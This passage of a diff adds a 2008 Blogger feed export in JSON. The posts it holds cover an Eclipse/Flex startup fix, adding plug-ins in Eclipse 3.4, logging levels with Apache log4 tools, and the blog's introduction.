href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiglO7-Ivy8vmFPLSmdVtz5nx_KBiyGx-wvcmIXHGUTPU8jLa5XkHPRrIs8ogC9rITQp2qKX9ora-_GXpmU2DDR64d45WkWywHpdEIwh4_NNjH4clYBagn4zP4u7ifLku3TWtM_vAnFev0U/s1600-h/ECLIPSE_FLEX_3.4_ERROR_2.JPG\"><img style=\"margin: 0pt 10px 10px 0pt; float: left; cursor: pointer; width: 400px; height: 234px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiglO7-Ivy8vmFPLSmdVtz5nx_KBiyGx-wvcmIXHGUTPU8jLa5XkHPRrIs8ogC9rITQp2qKX9ora-_GXpmU2DDR64d45WkWywHpdEIwh4_NNjH4clYBagn4zP4u7ifLku3TWtM_vAnFev0U/s400/ECLIPSE_FLEX_3.4_ERROR_2.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5281097108657255090\" border=\"0\" /></a></p><p><br /></p><p><br /></p><p><br /></p><p><br /></p><p><br /></p><p><br /></p><p><br /></p><p><br /></p><p>And at Eclipse start up add parameter -clean: eclipse.exe -clean<br />Or from the Flex launcher add this parameter too:<br />      eclipse.exe -clean -showlocation -vm  ...</p><p>It's working for me now.<br /></p>"
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/8620007191675059042/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2008/12/flex-build-30194161-not-working-with.html#comment-form",
+            "title": "0 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/8620007191675059042"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/8620007191675059042"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2008/12/flex-build-30194161-not-working-with.html",
+            "title": "Flex build 3.0.194161 not working with Eclipse 3.4 solution"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "media$thumbnail": {
+          "xmlns$media": "http://search.yahoo.com/mrss/",
+          "url": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh1cW7jZoKiiWJUEcRng5-BWn2zDrV439c51BYspeRi9b6jBRVv465SdjFPBUwBz3T9f08tfqemJxJdZlTOU0MkPTH0BNoekmv1iG3aAsXNTYZZdsb09-P2LnOu0l4Z6dUu66YpYmFyVxXQ/s72-c/ECLIPSE_FLEX_3.4_ERROR.JPG",
+          "height": "72",
+          "width": "72"
+        },
+        "thr$total": {
+          "$t": "0"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-2621509497455269162"
+        },
+        "published": {
+          "$t": "2008-12-18T01:23:00.000-08:00"
+        },
+        "updated": {
+          "$t": "2008-12-18T01:54:02.464-08:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Eclipse"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Plug-In"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "Add external extension to Eclipse 3.4"
+        },
+        "content": {
+          "type": "html",
+          "$t": "I got wonder when I try to find place to add External Extension in Eclipse 3.4 because it doesn't have the URL as: <span style=\"font-weight: bold;\">Help -> Software Updates -> Manage Configurations</span> as Eclipse 3.2.x<br /><br />On the net, I found the solution, here it is:<br />Go to: <span style=\"font-weight: bold;\">Help -> Software Updates</span> : One windows will come up<br />On Tab <span style=\"font-weight: bold;\">Available Softwares</span>, Click on <span style=\"font-weight: bold;\">Add Site </span>and Then Choose <span style=\"font-weight: bold;\">Locale Button </span>to browse for the plug-in to add<br />Finally Click <span style=\"font-weight: bold;\">Install</span><br /><br />See the screen shot:<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhknH3IiZ6kaKpmtqSeEkz0N-O1BizhdNKJr14u4_uanMeVaXavG5PCPGD6AsKTwMFON7SPIjp-ELfgsBvgZoiEKM1IWnX1qd1eGsVi6C_mRGBowDbJx4tP1pmBMtq6J9VRxPdWGUvl6fl0/s1600-h/ECLIPSE_ADD_EXTENSION.JPG\"><img style=\"margin: 0pt 10px 10px 0pt; float: left; cursor: pointer; width: 400px; height: 305px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhknH3IiZ6kaKpmtqSeEkz0N-O1BizhdNKJr14u4_uanMeVaXavG5PCPGD6AsKTwMFON7SPIjp-ELfgsBvgZoiEKM1IWnX1qd1eGsVi6C_mRGBowDbJx4tP1pmBMtq6J9VRxPdWGUvl6fl0/s400/ECLIPSE_ADD_EXTENSION.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5281064795455085938\" border=\"0\" /></a>"
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/2621509497455269162/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2008/12/add-external-extension-to-eclipse-34.html#comment-form",
+            "title": "0 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/2621509497455269162"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/2621509497455269162"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2008/12/add-external-extension-to-eclipse-34.html",
+            "title": "Add external extension to Eclipse 3.4"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "media$thumbnail": {
+          "xmlns$media": "http://search.yahoo.com/mrss/",
+          "url": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhknH3IiZ6kaKpmtqSeEkz0N-O1BizhdNKJr14u4_uanMeVaXavG5PCPGD6AsKTwMFON7SPIjp-ELfgsBvgZoiEKM1IWnX1qd1eGsVi6C_mRGBowDbJx4tP1pmBMtq6J9VRxPdWGUvl6fl0/s72-c/ECLIPSE_ADD_EXTENSION.JPG",
+          "height": "72",
+          "width": "72"
+        },
+        "thr$total": {
+          "$t": "0"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-5906010012098779152"
+        },
+        "published": {
+          "$t": "2008-11-13T22:34:00.000-08:00"
+        },
+        "updated": {
+          "$t": "2008-11-13T23:11:44.667-08:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Java"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Log Management"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "MS DotNet"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Oracle"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "PHP"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "PLSQL"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "SQLPlus"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "Software Development and Logging"
+        },
+        "content": {
+          "type": "html",
+          "$t": "Beside understanding programming language and programming model etc. We must know how to manage the message from the development for user, for developer etc. We called logging.<br /><br />To manage log, we have many ways according to programming language and platform.<br /><br />Normally, most of the developers neglect on logging during development parse and starting to expect the log files when an issue happens. That's why log management becomes very important for software development that we need to spend time to manage it as much as possible during development parse.<br /><br />Log Management proceed into 4 levels:<br />1. Debug : this is a developer logging level. Should use it for any technical test or technical information that not requires to understand the business process.<br />2. Info : This is user logging level. Use it to describe the business process or information.<br />3. Warning: This log level is to focus on not mandatory missing element.<span style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;;\" lang=\"EN-US\"></span><br />4. Error : Use this log level in case of technical or functional error.<br /><br />There are many tools or add-on tool to help handling for various log management: (but I would suppose for open source project one, Apache)<br />- <a href=\"http://logging.apache.org/log4j/1.2/index.html\">log4j</a> : For Java<br />-<a href=\"http://logging.apache.org/log4net/index.html\"> log4Net</a> : For MS DotNet<br />- <a href=\"http://logging.apache.org/log4php/\">log4PHP</a> : For PHP<br />- <a href=\"http://www.oracle.com/technology/pub/articles/moulard_log4plsql.html\">log4plsql</a> : For PL/SQL or SQLPlus of Oracle"
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/5906010012098779152/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2008/11/software-development-and-logging.html#comment-form",
+            "title": "0 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/5906010012098779152"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/5906010012098779152"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2008/11/software-development-and-logging.html",
+            "title": "Software Development and Logging"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "thr$total": {
+          "$t": "0"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-2706875418579973795"
+        },
+        "published": {
+          "$t": "2008-10-23T00:04:00.000-07:00"
+        },
+        "updated": {
+          "$t": "2008-10-23T00:08:01.810-07:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "General"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "My brief..."
+        },
+        "content": {
+          "type": "html",
+          "$t": "Yes, the topic is layout here...<br /><br />I am gonna to prepare some articles variously in IT fields through my research and experience..<br /><br />I hope it would help many people and also to keep myself interesting in those research.."
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/2706875418579973795/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2008/10/my-brief.html#comment-form",
+            "title": "0 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/2706875418579973795"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/2706875418579973795"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2008/10/my-brief.html",
+            "title": "My brief..."
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "thr$total": {
+          "$t": "0"
+        }
+      }
+    ]
+  }
+}
